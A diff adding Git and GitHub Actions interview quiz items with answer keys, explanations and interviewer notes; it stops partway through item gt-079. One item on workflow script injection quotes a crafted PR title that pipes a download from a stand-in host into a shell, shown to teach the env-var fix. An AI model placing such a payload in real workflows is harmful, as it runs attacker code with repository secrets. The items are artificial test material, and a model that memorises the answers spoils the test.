@@ -528,6 +528,2122 @@
       "tags": ["git", "recovery"],
       "level": 2,
       "asked": "Follows naturally from 'never rebase shared branches'; the strong answer knows the check is against your last fetch, not the server's current state."
+    },
+    {
+      "id": "gt-036",
+      "q": "In Git's object model, what is a branch such as `feature/login`?",
+      "choices": [
+        "A copy of every file as it stood when the branch was created",
+        "A movable pointer: a ref holding the SHA of one commit",
+        "A list of the commit ids that were made while it was checked out",
+        "A separate object database that shares nothing with main"
+      ],
+      "answer": 1,
+      "why": "A branch is a ref, a tiny file (or packed-refs line) containing one commit SHA; committing moves it forward. The commits it 'contains' are simply everything reachable by following parents from that commit, which is why creating a branch is instant and costs nothing.",
+      "tags": ["git", "git-internals"],
+      "level": 1,
+      "asked": "A warm-up that reveals whether you have a model of Git or a list of memorised commands."
+    },
+    {
+      "id": "gt-037",
+      "q": "Which four object types make up Git's object database?",
+      "choices": [
+        "File, folder, snapshot and branch",
+        "Blob, diff, commit and ref",
+        "Blob, tree, commit and annotated tag",
+        "Blob, tree, patch object and remote-tracking ref"
+      ],
+      "answer": 2,
+      "why": "Blobs hold file contents, trees map names to blobs and subtrees, commits point at one tree plus parents and metadata, and annotated tags point at an object with a message. Git stores snapshots, not diffs; branches and remotes are refs, not objects.",
+      "tags": ["git", "git-internals"],
+      "level": 2,
+      "asked": "Used to check whether you know Git stores snapshots rather than diffs, which explains why many commands are cheap."
+    },
+    {
+      "id": "gt-038",
+      "q": "You rename a file without changing its contents and commit. What happens in the object database?",
+      "choices": [
+        "A new blob is stored under the new name and the old blob is deleted",
+        "Git records a rename object linking the old path to the new one",
+        "Nothing changes, because the commit only stores the diff of the rename",
+        "The same blob is reused; only the trees that list the name change"
+      ],
+      "answer": 3,
+      "why": "Objects are addressed by a hash of their content, so identical content is the same blob. File names live in tree objects, so a rename produces new trees and a new commit. Git has no rename object: `git log --follow` and diff rename detection infer it by comparing content.",
+      "tags": ["git", "git-internals"],
+      "level": 3,
+      "asked": "Probes content addressing; a strong answer mentions that rename detection is a heuristic, which is why huge edit-plus-rename commits lose history."
+    },
+    {
+      "id": "gt-039",
+      "q": "What does `HEAD` normally contain?",
+      "choices": [
+        "A symbolic reference to the current branch, such as `ref: refs/heads/main`",
+        "The SHA of the most recent commit pushed to the remote",
+        "The SHA of the commit you last checked out, whichever branch you happen to be on",
+        "The name of the remote branch your current branch is tracking"
+      ],
+      "answer": 0,
+      "why": "HEAD usually points at a branch name, and the branch points at a commit, so committing moves the branch and HEAD follows. When HEAD holds a raw SHA instead, you are in detached HEAD state. The upstream is branch configuration, not HEAD.",
+      "tags": ["git", "git-internals"],
+      "level": 2,
+      "asked": "Sets up the detached HEAD follow-up; knowing HEAD is usually indirect makes that state easy to explain."
+    },
+    {
+      "id": "gt-040",
+      "q": "You run `git checkout v1.4.0` to inspect a release, make a fix and commit it. What is the risk?",
+      "choices": [
+        "The commit is rejected, because tags are read-only snapshots",
+        "The commit silently moves the `v1.4.0` tag to your new commit",
+        "The commit is on no branch; switch away and only the reflog can find it",
+        "The commit is added to main, because tags always belong to main"
+      ],
+      "answer": 2,
+      "why": "Checking out a tag detaches HEAD. Commits made there are real but no branch points at them, so once you switch away they are unreachable except via the reflog and eventually garbage-collected. Run `git switch -c hotfix-1.4` first to keep them.",
+      "tags": ["git", "recovery"],
+      "level": 1,
+      "asked": "Tests whether 'detached HEAD' scares you or you know exactly what it means and how to keep the work."
+    },
+    {
+      "id": "gt-041",
+      "q": "You ran `git reset --hard HEAD~3` and realise you needed those commits. None were pushed. How do you get them back?",
+      "choices": [
+        "They are gone, because `--hard` deletes the commit objects immediately",
+        "Find the old tip in `git reflog` and `git reset --hard` to that entry",
+        "Run `git revert HEAD~3` to reapply the three removed commits",
+        "Use `git stash pop`, because `--hard` stashes what it discards"
+      ],
+      "answer": 1,
+      "why": "Reset only moves the branch pointer; the commits still exist, and the reflog records where HEAD was, so `git reset --hard HEAD@{1}` (or the SHA from the reflog) restores them. Revert creates inverse commits and stash is unrelated. Uncommitted changes wiped by `--hard` are the part you cannot recover this way.",
+      "tags": ["git", "recovery", "reflog"],
+      "level": 1,
+      "asked": "The classic 'I broke my branch' question; interviewers want the word reflog and the caveat about uncommitted work."
+    },
+    {
+      "id": "gt-042",
+      "q": "How long does a commit that is only reachable from the reflog survive by default?",
+      "choices": [
+        "Until the next `git push`, which prunes anything unreachable from the remote",
+        "Forever, because Git never deletes objects without a manual `git gc`",
+        "Until the terminal session ends, as the reflog lives in memory",
+        "About 30 days before reflog expiry, then until a later gc prunes it"
+      ],
+      "answer": 3,
+      "why": "Reflog entries for commits no longer reachable from any ref expire after 30 days by default (`gc.reflogExpireUnreachable`), reachable ones after 90; the automatic `git gc` then prunes the loose objects. The reflog is a file in `.git/logs`, and pushing never deletes local objects.",
+      "tags": ["git", "reflog"],
+      "level": 3,
+      "asked": "Distinguishes people who have actually recovered work from people who say 'Git never loses anything'."
+    },
+    {
+      "id": "gt-043",
+      "q": "A teammate asks you to recover commits they lost with `reset --hard`. Why can you not use your own clone's reflog?",
+      "choices": [
+        "The reflog is local: it records movements of refs in one repository only",
+        "The reflog needs the same Git version on both machines to be read",
+        "Reflogs are pushed only when `push.reflog` is enabled on the remote",
+        "Your reflog does have them, but only an admin can read other users' entries"
+      ],
+      "answer": 0,
+      "why": "Each clone keeps its own reflog of its own ref movements; nothing about it is shared by push or fetch. If the commits were never pushed, only their machine has them. If they were pushed, your remote-tracking branch or your reflog of it may still reference the old tip.",
+      "tags": ["git", "reflog"],
+      "level": 2,
+      "asked": "Checks that you understand what is local and what is shared, which is the root of most Git confusion."
+    },
+    {
+      "id": "gt-044",
+      "q": "What is the difference between `HEAD~2` and `HEAD^2`?",
+      "choices": [
+        "They are synonyms for the commit two steps back",
+        "`HEAD~2` is two commits back; `HEAD^2` is the commit made two days before HEAD",
+        "`HEAD~2` counts back on the remote; `HEAD^2` counts back locally",
+        "`HEAD~2` is the first-parent grandparent; `HEAD^2` is a merge's second parent"
+      ],
+      "answer": 3,
+      "why": "`~n` walks n generations along first parents. `^n` selects the nth parent of a single commit, which only exists for merges, so `HEAD^2` is the tip of the branch that was merged in. On a non-merge commit `HEAD^2` fails to resolve.",
+      "tags": ["git", "git-internals"],
+      "level": 2,
+      "asked": "Comes up when reverting or diffing merges; the strong answer mentions it matters only for merge commits."
+    },
+    {
+      "id": "gt-045",
+      "q": "What does `git log main..feature` list?",
+      "choices": [
+        "Commits on either branch but not on both",
+        "Commits reachable from `feature` that are not reachable from `main`",
+        "Commits on `main` that were made after `feature` branched off from it",
+        "Every commit between the oldest and newest of the two branch tips"
+      ],
+      "answer": 1,
+      "why": "Two dots mean 'reachable from the right, excluding anything reachable from the left', which is exactly what a pull request would add. Three dots (`main...feature`) give the symmetric difference, commits on either side but not both.",
+      "tags": ["git"],
+      "level": 2,
+      "asked": "Useful day to day for 'what is in this branch that is not released yet', and a good check of range syntax."
+    },
+    {
+      "id": "gt-046",
+      "q": "Why does a pull request diff usually match `git diff main...feature` rather than `git diff main feature`?",
+      "choices": [
+        "Three dots include uncommitted changes from your working tree",
+        "Two dots ignore whitespace changes, which review tools want to show",
+        "Three dots diff from the merge base, so new commits on main are not shown",
+        "Two dots compare only the first commit of each branch"
+      ],
+      "answer": 2,
+      "why": "`git diff A...B` compares the merge base of A and B with B, so it shows only the branch's own changes. The two-argument form compares the tips directly, so anything merged into main since you branched appears as if your branch had reverted it.",
+      "tags": ["git", "code-review"],
+      "level": 3,
+      "asked": "Explains a real confusion: 'why does my diff show changes I did not make?' after main moves on."
+    },
+    {
+      "id": "gt-047",
+      "q": "You rebase a branch with three commits onto the latest main. What happens to the commit SHAs?",
+      "choices": [
+        "They are unchanged, because the file changes in each commit are the same",
+        "Only the first commit gets a new SHA; the others keep theirs",
+        "They change only if a conflict had to be resolved during the rebase",
+        "All three get new SHAs, because each now has a different parent"
+      ],
+      "answer": 3,
+      "why": "A commit's id hashes its tree, parents, author, committer and message, so replaying it on a new base creates a new commit even when the patch is identical. That is why rebasing shared commits forces everyone else to reconcile a history that no longer matches theirs.",
+      "tags": ["git", "rebase"],
+      "level": 2,
+      "asked": "The mechanism behind 'do not rebase shared branches', which interviewers want explained rather than recited."
+    },
+    {
+      "id": "gt-048",
+      "q": "During `git rebase main`, a conflict stops the rebase. In `git checkout --ours file`, what is 'ours'?",
+      "choices": [
+        "The version from main, the base being replayed onto",
+        "The version from your feature branch commit being replayed",
+        "The version from the merge base of the two branches",
+        "The version currently saved in your working directory"
+      ],
+      "answer": 0,
+      "why": "Rebase works by checking out the new base and applying your commits onto it, so 'ours' is the branch you are rebasing onto and 'theirs' is your own commit. It is the reverse of a merge, where 'ours' is your checked-out branch.",
+      "tags": ["git", "rebase", "merge-conflicts"],
+      "level": 3,
+      "asked": "A favourite trap because the answer is counter-intuitive; knowing why (rebase replays onto the base) is the strong answer."
+    },
+    {
+      "id": "gt-049",
+      "q": "You need to fix a typo in the second-to-last commit of your unpushed branch. What is the tidy way?",
+      "choices": [
+        "Run `git commit --amend`, which edits any commit you name",
+        "Commit with `--fixup=<sha>`, then `git rebase -i --autosquash`",
+        "Revert the commit and make a corrected copy of it",
+        "Reset to that commit with `--hard` and redo the last commit by hand"
+      ],
+      "answer": 1,
+      "why": "`--fixup` creates a commit titled `fixup! <subject>`, and `--autosquash` moves it next to its target and marks it to be folded in. `--amend` only rewrites the latest commit. Revert leaves both the mistake and the correction in history.",
+      "tags": ["git", "rebase", "history"],
+      "level": 2,
+      "asked": "Shows you keep reviewable history without heroics; people who know autosquash usually know interactive rebase well."
+    },
+    {
+      "id": "gt-050",
+      "q": "In an interactive rebase todo list, what is the difference between `squash` and `fixup`?",
+      "choices": [
+        "`squash` merges the commit into the next one; `fixup` into the previous",
+        "`squash` keeps the author; `fixup` makes you the author of the result",
+        "`squash` combines messages for editing; `fixup` keeps only the earlier one",
+        "`squash` needs a clean working tree; `fixup` works with local changes"
+      ],
+      "answer": 2,
+      "why": "Both fold the commit into the one above it in the list. `squash` opens an editor with both messages combined; `fixup` discards the folded commit's message. Neither changes which commit it folds into or requires different working-tree state.",
+      "tags": ["git", "rebase", "history"],
+      "level": 1,
+      "asked": "Basic interactive-rebase fluency; the follow-up is usually 'when would you tidy history before a PR'."
+    },
+    {
+      "id": "gt-051",
+      "q": "Your branch was cut from `release-2` but should target `main`. Which command moves only your own commits?",
+      "code": "git rebase --onto main release-2 my-feature",
+      "lang": "sh",
+      "choices": [
+        "It replays the commits after `release-2` up to `my-feature` onto main",
+        "It merges `release-2` into main and then rebases `my-feature` on top",
+        "It moves `release-2` onto main and leaves `my-feature` untouched",
+        "It copies all of `release-2`'s history into main before your commits"
+      ],
+      "answer": 0,
+      "why": "`--onto <newbase> <upstream> <branch>` takes the commits in `upstream..branch` and replays them onto newbase. A plain `git rebase main` would also drag across every release-2 commit not on main, which is exactly what you want to avoid.",
+      "tags": ["git", "rebase"],
+      "level": 3,
+      "asked": "Separates people who use rebase from people who understand it; also the fix for stacked branches after a squash merge."
+    },
+    {
+      "id": "gt-052",
+      "q": "You are halfway through a messy rebase and want to go back to exactly where you started. What do you run?",
+      "choices": [
+        "`git reset --hard HEAD~1`",
+        "`git rebase --skip`",
+        "`git rebase --abort`",
+        "`git checkout main`"
+      ],
+      "answer": 2,
+      "why": "`--abort` restores the branch and working tree to their pre-rebase state. `--skip` drops the current commit and carries on, and a reset of one commit only undoes one replayed step. After a finished rebase, `ORIG_HEAD` or the reflog gets you back.",
+      "tags": ["git", "rebase", "recovery"],
+      "level": 1,
+      "asked": "Low-stakes but telling: people who know the escape hatch are far less afraid of rebase."
+    },
+    {
+      "id": "gt-053",
+      "q": "A rebase finished, but the result is wrong. Which ref usually points at the branch tip from before it?",
+      "choices": [
+        "`FETCH_HEAD`",
+        "`ORIG_HEAD`",
+        "`MERGE_HEAD`",
+        "`HEAD@{upstream}`"
+      ],
+      "answer": 1,
+      "why": "Rebase, reset and merge record the previous tip in `ORIG_HEAD`, so `git reset --hard ORIG_HEAD` undoes them if you have not run another such command since. `FETCH_HEAD` is what was last fetched and `MERGE_HEAD` exists only during a merge.",
+      "tags": ["git", "recovery"],
+      "level": 2,
+      "asked": "A quick recovery shortcut; the strong answer adds that the reflog is the fallback once ORIG_HEAD has moved."
+    },
+    {
+      "id": "gt-054",
+      "q": "You amend a commit that you already pushed to your own PR branch. What happens on the next plain `git push`?",
+      "choices": [
+        "It is rejected as non-fast-forward, because the pushed commit was replaced",
+        "It succeeds and the remote keeps both versions of the commit",
+        "It succeeds, because amending keeps the original commit's SHA",
+        "It pushes a new merge commit joining the old and amended versions"
+      ],
+      "answer": 0,
+      "why": "Amending creates a new commit with a new SHA whose parent is the old commit's parent, so the remote branch is no longer an ancestor of yours. You must force-push, ideally with `--force-with-lease`, which is fine on your own branch and harmful on a shared one.",
+      "tags": ["git", "history"],
+      "level": 1,
+      "asked": "Connects amend to rewriting history, which many juniors do without realising."
+    },
+    {
+      "id": "gt-055",
+      "q": "`git stash pop` hits a conflict. What state are you left in?",
+      "choices": [
+        "The pop is cancelled and your working tree is untouched",
+        "The stash is applied with markers and deleted, so resolve carefully",
+        "The stash is applied with conflict markers and kept in the stash list",
+        "The conflicting files are skipped and the rest are applied cleanly"
+      ],
+      "answer": 2,
+      "why": "When the apply conflicts, Git leaves conflict markers and deliberately does not drop the entry, printing 'The stash entry is kept in case you need it again'. Resolve, then `git stash drop` yourself. A dropped stash can still be found with `git fsck --unreachable` for a while.",
+      "tags": ["git", "stash"],
+      "level": 2,
+      "asked": "Everyday situation; the strong answer knows the stash is kept and needs a manual drop."
+    },
+    {
+      "id": "gt-056",
+      "q": "You run `git stash`, then `git status` still shows a new untracked file. Why?",
+      "choices": [
+        "The file is ignored by `.gitignore`, so stash skips it",
+        "Stash only saves files that are staged with `git add`",
+        "The stash failed, because untracked files block it",
+        "Stash saves tracked changes only unless you pass `-u`"
+      ],
+      "answer": 3,
+      "why": "By default stash saves modifications to tracked files, staged or not, and leaves untracked files alone. `git stash -u` includes untracked files and `-a` also includes ignored ones. The file is simply not tracked yet, which is different from ignored.",
+      "tags": ["git", "stash"],
+      "level": 1,
+      "asked": "Explains a common 'why did my switch carry this file along' moment."
+    },
+    {
+      "id": "gt-057",
+      "q": "What is the modern, single-purpose command to discard unstaged changes to one file?",
+      "choices": [
+        "`git reset --hard file.ts`",
+        "`git restore file.ts`",
+        "`git revert file.ts`",
+        "`git clean file.ts`"
+      ],
+      "answer": 1,
+      "why": "Git 2.23 split `checkout` into `switch` (branches) and `restore` (files); `git restore file.ts` resets the working copy from the index, and `--staged` unstages. `reset --hard` does not take paths, revert works on commits, and clean removes untracked files.",
+      "tags": ["git"],
+      "level": 1,
+      "asked": "Shows you know current Git rather than only the overloaded `checkout`."
+    },
+    {
+      "id": "gt-058",
+      "q": "You accidentally committed `.env` a month ago and have now added it to `.gitignore`. It still shows as modified. Why?",
+      "choices": [
+        "`.gitignore` only takes effect after `git gc` runs",
+        "`.gitignore` is read from main only, not your branch",
+        "`.gitignore` only affects untracked files; run `git rm --cached .env`",
+        "`.gitignore` patterns need a leading slash before they match dotfiles like `.env`"
+      ],
+      "answer": 2,
+      "why": "Ignore rules stop untracked files being added; a tracked file stays tracked. `git rm --cached` stops tracking it while keeping it on disk. The secret is still in history, so it must be rotated regardless of any history rewrite.",
+      "tags": ["git", "secrets"],
+      "level": 1,
+      "asked": "Very common; the strong answer adds 'and rotate the secret, because history still has it'."
+    },
+    {
+      "id": "gt-059",
+      "q": "A secret was pushed to a public repository an hour ago. What must you do first?",
+      "choices": [
+        "Rewrite history with `git filter-repo` and force-push every branch",
+        "Revoke and rotate the secret, then decide whether to rewrite history",
+        "Make the repository private so the commit is no longer reachable",
+        "Delete the branch the commit is on and open a fresh one"
+      ],
+      "answer": 1,
+      "why": "Public pushes are scraped by bots within minutes, so assume it is compromised and rotate it now. Rewriting history is secondary: forks, clones, caches and PR refs keep the old commit, and deleting a branch or going private does not unpublish what was already fetched.",
+      "tags": ["git", "secrets", "incident-response"],
+      "level": 2,
+      "asked": "Judgement over commands: the wrong answer spends an hour on filter-repo while the key is being used."
+    },
+    {
+      "id": "gt-060",
+      "q": "Why do many teams add a `.git-blame-ignore-revs` file after running a formatter over the codebase?",
+      "choices": [
+        "So `git blame` can skip those commits and show the real author of each line",
+        "So the formatting commits are excluded from `git log` and releases",
+        "So CI skips re-running the formatter and linter on those particular commits",
+        "So reviewers are not asked to approve the formatting commits"
+      ],
+      "answer": 0,
+      "why": "Listing the formatting commit SHAs lets `git blame --ignore-revs-file` (or `blame.ignoreRevsFile`, which GitHub also honours) attribute lines to the commit before the reformat. Without it, one mass reformat makes blame useless across the codebase.",
+      "tags": ["git", "tooling"],
+      "level": 3,
+      "asked": "A small sign of experience on a real codebase; it comes up when discussing adopting Prettier or dotnet format."
+    },
+    {
+      "id": "gt-061",
+      "q": "You want the commit that removed the function `applyDiscount` from the codebase. Which command finds it?",
+      "choices": [
+        "`git blame -- applyDiscount`",
+        "`git grep applyDiscount HEAD`",
+        "`git log --follow applyDiscount`",
+        "`git log -S applyDiscount`"
+      ],
+      "answer": 3,
+      "why": "The pickaxe `-S` lists commits that changed how many times the string occurs, so it finds both the addition and the removal. `git grep` searches one snapshot, blame explains lines that still exist, and `--follow` tracks a file path, not a symbol.",
+      "tags": ["git", "debugging"],
+      "level": 2,
+      "asked": "Code archaeology comes up in debugging interviews; pickaxe is the answer that saves an afternoon."
+    },
+    {
+      "id": "gt-062",
+      "q": "You want to bisect automatically using a test script. What must the script's exit code signal?",
+      "choices": [
+        "0 for good, 125 to skip, and other codes below 128 for bad",
+        "0 for bad, 1 for good, and any other value to stop bisecting",
+        "Any output on stderr means bad; silence means good",
+        "0 for good and 1 for bad; the exit code cannot express 'skip'"
+      ],
+      "answer": 0,
+      "why": "`git bisect run` treats 0 as good, 1 to 127 except 125 as bad, and 125 as 'cannot test this one', for example a commit that does not build. Values above 127 abort the bisect. A script that reproduces the bug turns a manual hunt into a few minutes of unattended work.",
+      "tags": ["git", "debugging"],
+      "level": 3,
+      "asked": "Follows 'what is bisect'; knowing `bisect run` and skip shows you have actually used it on a regression."
+    },
+    {
+      "id": "gt-063",
+      "q": "You need to review a colleague's branch while your own branch has half-finished work. What avoids stashing and switching?",
+      "choices": [
+        "`git clone` the repository again into a second folder",
+        "`git worktree add ../review their-branch`",
+        "`git checkout --detach their-branch`",
+        "`git sparse-checkout set their-branch`"
+      ],
+      "answer": 1,
+      "why": "A worktree is a second working directory attached to the same repository and object database, so you can have both branches checked out at once without a second clone or a second fetch. Detaching still replaces your working tree, and sparse-checkout limits which paths are present.",
+      "tags": ["git", "tooling"],
+      "level": 2,
+      "asked": "A practical workflow question; worktrees are also how people run a long test suite on one branch while coding on another."
+    },
+    {
+      "id": "gt-064",
+      "q": "In a GitHub Actions job, `git describe --tags` fails with 'No names found'. The repository does have tags. Why?",
+      "choices": [
+        "Tags are stored separately and need a GitHub token scope to read",
+        "Tags are only visible on the default branch, not on PR branches",
+        "`git describe` needs an annotated tag and ignores all tags otherwise",
+        "The checkout is shallow, so the history and tags were not fetched"
+      ],
+      "answer": 3,
+      "why": "`actions/checkout` fetches a single commit by default (`fetch-depth: 1`). With no history and no tags there is nothing to describe. Set `fetch-depth: 0`, or fetch tags explicitly, in jobs that compute versions or changelogs.",
+      "tags": ["git", "ci", "github-actions"],
+      "level": 2,
+      "asked": "A real CI debugging moment; the answer shows you know CI clones differ from your local clone."
+    },
+    {
+      "id": "gt-065",
+      "q": "You push `main` after creating tag `v2.1.0` locally. The tag is not on the remote. Why?",
+      "choices": [
+        "Tags are pushed only when their commit is the newest on the branch",
+        "`git push` does not send tags unless told to, e.g. with `--follow-tags`",
+        "Tags are local-only and cannot be pushed; releases use GitHub instead",
+        "The tag needs a `v` prefix to be recognised as a release"
+      ],
+      "answer": 1,
+      "why": "A normal push sends the branch refs you name, not tags. `git push origin v2.1.0` sends one tag; `--follow-tags` sends annotated tags reachable from the pushed commits, but not lightweight ones.",
+      "tags": ["git", "versioning"],
+      "level": 1,
+      "asked": "Everyday release mechanics; the strong answer knows the annotated-versus-lightweight difference."
+    },
+    {
+      "id": "gt-066",
+      "q": "What is the practical difference between an annotated tag and a lightweight tag?",
+      "choices": [
+        "Annotated tags are pushed automatically; lightweight tags are local",
+        "Annotated tags can point at any object; lightweight tags only at branches",
+        "Annotated tags are separate objects with tagger, date and message",
+        "Annotated tags are immutable; lightweight tags follow the branch"
+      ],
+      "answer": 2,
+      "why": "A lightweight tag is just a ref to a commit. An annotated tag is a tag object with its own metadata (and optional signature) that the ref points to. `git describe` uses annotated tags by default, which is why release tags should be annotated. Neither kind moves on its own.",
+      "tags": ["git", "versioning", "git-internals"],
+      "level": 2,
+      "asked": "Release hygiene; ties into describe, signing and --follow-tags."
+    },
+    {
+      "id": "gt-067",
+      "q": "Your team squash-merges PRs. You branched `part-2` off `part-1` before `part-1` was merged. Rebasing `part-2` on main now conflicts with its own changes. Why?",
+      "choices": [
+        "Squash merges disable rebase detection until the branch is deleted",
+        "Main now has one squash commit with different SHAs from part-1's commits",
+        "`part-1`'s commits were deleted from the remote when it was merged",
+        "Git cannot rebase a branch whose parent branch no longer exists"
+      ],
+      "answer": 1,
+      "why": "Squash merging creates a brand-new commit, so Git does not recognise part-1's original commits as already applied and tries to replay them again. `git rebase --onto main part-1 part-2` (or `--update-refs` stacks) replays only part-2's own commits.",
+      "tags": ["git", "rebase", "process"],
+      "level": 3,
+      "asked": "Hits everyone who stacks PRs in a squash-merge team; the `--onto` fix is the strong answer."
+    },
+    {
+      "id": "gt-068",
+      "q": "After squash-merging your PR, `git branch -d my-feature` says the branch is not fully merged. Is something wrong?",
+      "choices": [
+        "No: the squash commit is new, so Git cannot see your commits in main",
+        "Yes: the squash merge silently dropped some of your changes",
+        "Yes: the remote branch must be deleted before the local one",
+        "No: `-d` always refuses branches that were pushed"
+      ],
+      "answer": 0,
+      "why": "`-d` checks reachability, and your original commits are not ancestors of main after a squash merge even though their changes are. Once you have confirmed the PR merged, `-D` is safe. `git fetch --prune` tidies stale remote-tracking branches.",
+      "tags": ["git", "process"],
+      "level": 1,
+      "asked": "Everyday confusion that tests whether you understand reachability versus content."
+    },
+    {
+      "id": "gt-069",
+      "q": "You need to undo a merge commit that is already on main. What does `git revert -m 1 <merge-sha>` do?",
+      "choices": [
+        "Reverts only the first commit of the merged branch",
+        "Removes the merge commit from history and force-pushes main",
+        "Reverts the merge but keeps the branch's commits in history as if unmerged",
+        "Adds a commit undoing the merged changes, relative to parent 1"
+      ],
+      "answer": 3,
+      "why": "A merge has two parents, so revert needs to know which side is mainline; `-m 1` means keep the first parent (main) and undo what the merge brought in. Later re-merging the same branch will not bring those commits back, because Git considers them merged: you revert the revert instead.",
+      "tags": ["git", "recovery"],
+      "level": 3,
+      "asked": "Asked of people who have handled a bad merge; the 'revert the revert' follow-up is what separates answers."
+    },
+    {
+      "id": "gt-070",
+      "q": "Your repository has `* text=auto` in `.gitattributes`. What does it do?",
+      "choices": [
+        "Makes Git treat every file as text, including images and binaries",
+        "Converts all files to the author's local line endings on commit",
+        "Stores detected text files with LF in the repository, whatever the OS",
+        "Forces UTF-8 encoding without a BOM on every text file when it is committed"
+      ],
+      "answer": 2,
+      "why": "Git detects which files are text and normalises their line endings to LF in the object database, converting on checkout according to `eol` settings. Committing it in `.gitattributes` makes the rule apply to everyone, unlike per-machine `core.autocrlf`. It does not touch encoding.",
+      "tags": ["git", "tooling"],
+      "level": 2,
+      "asked": "Mixed Windows and macOS teams hit whole-file diffs from CRLF; this is the fix that sticks."
+    },
+    {
+      "id": "gt-071",
+      "q": "In GitHub Actions, a workflow has a `build` job and a `test` job with no `needs`. How do they run?",
+      "choices": [
+        "In parallel, on separate fresh runners that share no files",
+        "One after another in file order, on one shared runner",
+        "In parallel, on one runner, sharing a single checked-out workspace",
+        "In file order, stopping at the first job that fails"
+      ],
+      "answer": 0,
+      "why": "Jobs are independent by default: each gets its own runner and a clean workspace. `needs: build` makes test wait for build, and anything build produced must be passed across with artifacts or a cache, because the filesystem is not shared.",
+      "tags": ["ci", "github-actions"],
+      "level": 1,
+      "asked": "The first thing people get wrong when splitting a pipeline into jobs; the follow-up is how to pass the build output along."
+    },
+    {
+      "id": "gt-072",
+      "q": "Your `deploy` job needs the `dist/` folder produced by the `build` job. What is the standard way to hand it over?",
+      "choices": [
+        "Write it to `/tmp`, which all jobs in a run share",
+        "Upload it as an artifact in build and download it in deploy",
+        "Commit `dist/` back to the branch in build and pull it in deploy",
+        "Use a job-level `outputs:` value to pass the folder's contents"
+      ],
+      "answer": 1,
+      "why": "Artifacts (`actions/upload-artifact` and `download-artifact`) are the mechanism for files produced in one job and consumed by another in the same run. Job outputs carry small strings such as a version number. Each job has its own runner, so `/tmp` is not shared, and committing build output pollutes history.",
+      "tags": ["ci", "github-actions"],
+      "level": 1,
+      "asked": "Tests whether you know the difference between artifacts, caches and outputs, which people often mix up."
+    },
+    {
+      "id": "gt-073",
+      "q": "What is the difference between a cache and an artifact in GitHub Actions?",
+      "choices": [
+        "Caches are per job; artifacts are shared by every workflow in the repo",
+        "Caches store secrets safely; artifacts are public to anyone who can read the repo",
+        "Caches speed up later runs with reusable inputs; artifacts keep a run's outputs",
+        "Caches are kept forever; artifacts are deleted when the run finishes"
+      ],
+      "answer": 2,
+      "why": "A cache, keyed by something like the lockfile hash, restores dependencies so future runs are faster, and a miss must be harmless. An artifact is a run's product, such as a build, report or coverage file, kept for a retention period. Caches are evicted when unused or over quota, not kept forever.",
+      "tags": ["ci", "github-actions", "caching"],
+      "level": 2,
+      "asked": "Distinguishes speed-ups from deliverables; the strong answer adds that a cache miss must never change the result."
+    },
+    {
+      "id": "gt-074",
+      "q": "What does this step do, and why is it there?",
+      "code": "- uses: actions/setup-node@v4\n  with:\n    node-version: 24\n    cache: npm",
+      "lang": "yaml",
+      "choices": [
+        "Caches `node_modules` itself so `npm ci` can be skipped entirely on later runs",
+        "Caches the Node binary so the runner does not download Node again",
+        "Caches the npm download cache, keyed on the lockfile, to speed up `npm ci`",
+        "Caches the build output so unchanged packages are not rebuilt"
+      ],
+      "answer": 2,
+      "why": "`cache: npm` saves npm's global package cache keyed on a hash of `package-lock.json`; `npm ci` still runs and still deletes `node_modules`, but downloads come from the cache. Caching `node_modules` directly is fragile across Node versions and OSes.",
+      "tags": ["ci", "github-actions", "npm"],
+      "level": 2,
+      "asked": "Common in take-home CI setups; shows you know why `npm ci` still runs."
+    },
+    {
+      "id": "gt-075",
+      "q": "A workflow step contains the line below. Why is it a security problem?",
+      "code": "run: echo \"Title: ${{ github.event.pull_request.title }}\"",
+      "lang": "yaml",
+      "choices": [
+        "PR titles count as secrets and appear unmasked in the job log",
+        "The expression is substituted into the script, so a crafted title runs as shell",
+        "`echo` sends the title to GitHub's audit log, which anyone can read",
+        "The expression is evaluated on the fork's runner, where it can read all of your secrets"
+      ],
+      "answer": 1,
+      "why": "`${{ }}` is expanded into the script text before the shell runs, so a title such as `\"; curl evil.sh | sh; \"` becomes code. Pass untrusted values through `env:` and reference them as `\"$TITLE\"`, which the shell treats as data.",
+      "tags": ["ci", "github-actions", "security"],
+      "level": 3,
+      "asked": "Script injection in workflows is a real, widely exploited bug class; interviewers for senior-leaning roles like hearing the env-var fix."
+    },
+    {
+      "id": "gt-076",
+      "q": "Why do security guides recommend pinning third-party actions to a full commit SHA instead of `@v4`?",
+      "choices": [
+        "A tag can be moved to malicious code; a commit SHA cannot be changed",
+        "SHAs make the workflow start faster, because GitHub skips version resolution",
+        "Tags only work for actions published by GitHub itself",
+        "`@v4` always resolves to the latest major, which may break your build"
+      ],
+      "answer": 0,
+      "why": "Git tags are mutable, so a compromised maintainer account can repoint `v4` at code that steals your secrets, as happened with a popular action in 2025. A SHA names exact content. Dependabot or Renovate can keep pinned SHAs up to date with a version comment.",
+      "tags": ["ci", "github-actions", "security"],
+      "level": 2,
+      "asked": "Supply-chain security is now a standard CI question; the strong answer mentions keeping pins updated automatically."
+    },
+    {
+      "id": "gt-077",
+      "q": "What does this workflow-level block achieve?",
+      "code": "permissions:\n  contents: read",
+      "lang": "yaml",
+      "choices": [
+        "Only users with read access to the repository can trigger the workflow",
+        "The workflow can read secrets but cannot print them in logs",
+        "Jobs may read repository files but cannot use any secrets at all",
+        "The `GITHUB_TOKEN` can read the repo and do nothing else"
+      ],
+      "answer": 3,
+      "why": "The `permissions` key scopes the automatic `GITHUB_TOKEN`; any scope not listed is set to none. Jobs that must comment on PRs or publish packages opt in per job. It has nothing to do with who may trigger the workflow or with your own secrets.",
+      "tags": ["ci", "github-actions", "security"],
+      "level": 2,
+      "asked": "Least privilege applied to CI; interviewers want to hear that a compromised step can only do what the token allows."
+    },
+    {
+      "id": "gt-078",
+      "q": "A PR from a fork runs your `pull_request` workflow, and the step that uses `secrets.NPM_TOKEN` gets an empty value. Why?",
+      "choices": [
+        "Secrets must be re-entered on every fork before they can be used",
+        "The secret expired, because repository secrets rotate automatically after every pull request",
+        "Secrets are not given to fork PR runs, so untrusted code cannot steal them",
+        "Secrets only work in workflows triggered by `push` to the default branch"
+      ],
+      "answer": 2,
+      "why": "For `pull_request` events from forks, GitHub withholds repository secrets and gives a read-only `GITHUB_TOKEN`, because the workflow runs code the fork author wrote. Design fork CI to need no secrets; `pull_request_target` has secrets precisely because it must never run the fork's code.",
+      "tags": ["ci", "github-actions", "security"],
+      "level": 2,
+      "asked": "Relevant to anyone maintaining a public repository; leads straight into the pull_request_target trap."
+    },
+    {
+      "id": "gt-079",
+      "q": "A workflow uses `on: pull_request_target`, checks out the PR's head commit and runs `npm install && npm test`. What is wrong?",
